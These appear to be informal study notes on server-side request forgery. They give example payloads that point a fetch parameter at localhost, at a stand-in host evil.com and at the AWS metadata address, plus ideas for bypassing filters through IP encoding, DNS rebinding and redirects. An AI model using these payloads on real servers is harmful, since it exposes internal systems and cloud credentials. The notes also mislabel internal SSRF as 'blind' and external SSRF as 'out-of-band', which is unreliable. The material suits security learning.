What is SSRF?
SSRF is When we access internal server through a vulnareable prameter which is used to communicate to the microservices or api's

For example:
a web app sends the request with parameter:
"STOCKAPI = http://shop.com/product/stock/..."
now we can easily remove the website and put "localhost" to access internal server like:
"STOCKAPI = http://localhost/admin"

IMPACTS:
Internal network scanning (port scanning)
Remote code execution (RCE)
Application level DDOS attack

2 Types of SSRF:

1- Reguler / In Band : Getting Response of payload from site
2- Blind / Out Of Band : No Response of Payload

How to hunt SSRF ?
Step 1 - find request containing Hostname, IP, full url
Step 2 - Change that parameter value to a malicious payload
Step 3 - Analyse the response

how to bypass common mechanism of preventing SSRF
Method 1 - Blacklisting using reguler expression or keyword
          a - Bypassing : if 127.0.0.1 is blacklisted you can convert it into octal or binary form and server will never identify
          b - DNS Rebinding
          c - HTTP Redirection
          d - Exploiting URL Parser

internal vs. external SSRF
External SSRF (Out-of-Band SSRF)
 Target: Websites or services on the public internet
 Example: Attacking https://example.com but making it fetch data from another external site like https://evil.com.
 Impact: Can be used to:

Steal data from APIs
Bypass firewalls
Exploit misconfigured cloud services (e.g., AWS metadata service)
 Example Request:

GET /fetch?url=https://evil.com
Host: victim.com

If victim.com fetches the URL without validation, it may leak sensitive data.

Internal SSRF (Blind SSRF)
 Target: The internal network of the victimâ€™s server (e.g., localhost, private IPs like 192.168.1.1)
 Example: Attacking https://example.com but making it access http://localhost/admin
 Impact: Can be used to:

Access internal admin panels (e.g., http://localhost/admin)
Scan internal networks
Attack internal cloud services (e.g., AWS metadata: http://169.254.169.254/latest/meta-data/)
 Example Request:

GET /fetch?url=http://localhost/admin
Host: victim.com

If victim.com makes the request without restrictions, an attacker may gain access to internal systems.
